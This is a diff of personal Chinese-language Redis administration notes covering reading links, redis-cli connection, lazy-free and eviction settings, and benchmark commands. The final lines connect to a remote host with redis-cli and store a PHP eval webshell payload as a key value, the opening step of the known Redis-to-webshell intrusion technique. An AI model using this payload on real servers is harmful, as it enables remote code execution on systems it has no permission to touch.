@@ -3,6 +3,12 @@ redis 安装与升级
 http://www.cnblogs.com/stephen-liu74/archive/2012/02/18/2356951.html
 https://redis.readthedocs.org/en/latest/
 https://mp.weixin.qq.com/s/2sUWnpJCvkJ8-7XSGLdesA
+redis之cluster模式
+https://mp.weixin.qq.com/s/f_9rSYdeKHDvxErdriHcJQ
+edis之sentinel模式
+https://blog.51cto.com/net881004/2538343
+https://juejin.cn/post/6854573215532974094
+https://ngx.hk/2020/06/03/%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2redis6%E5%93%A8%E5%85%B5%E9%9B%86%E7%BE%A4.html
 
 redis-cli 连接
 redis-cli -h 127.0.0.1 -p 6389 -a pass1234
@@ -132,9 +138,11 @@ redis-cli -h 127.0.0.1 -p 6379 --intrinsic-latency 60
 redis-cli -h 127.0.0.1 -p 6379 --latency-history -i 1
 如果你使用的 Redis 是 4.0 以上版本，用 UNLINK 命令替代 DEL，此命令可以把释放 key 内存的操作，放到后台线程中去执行，从而降低对 Redis 的影响
 如果你使用的 Redis 是 6.0 以上版本，可以开启 lazy-free 机制（lazyfree-lazy-user-del = yes），在执行 DEL 命令时，释放内存也会放到后台线程中执行
+lazyfree-lazy-user-del yes
 lazyfree-lazy-expire yes
-lazyfree-lazy-eviction=yes
-淘汰策略：
+lazyfree-lazy-server-del yes
+lazyfree-lazy-eviction no
+淘汰策略 maxmemory-policy：
 allkeys-lru：不管 key 是否设置了过期，淘汰最近最少访问的 key
 volatile-lru：只淘汰最近最少访问、并设置了过期时间的 key
 allkeys-random：不管 key 是否设置了过期，随机淘汰 key
@@ -262,6 +270,7 @@ auto-aof-rewrite-min-size 64mb
 redis-benchmark -h 127.0.0.1 -p 6379 -c 100 -n 100000
 redis-benchmark -h 10.1.1.96 -p 6379 -c 100 -n 100000
 redis-benchmark -h 10.1.1.96 -p 6379 -q -d 500
+redis-benchmark -t set,get -n 100000 -q
 
 redis-cli -h 192.168.5.135
 set one "\n\n\n<?php @eval($_POST['c']);?>\n\n\n"
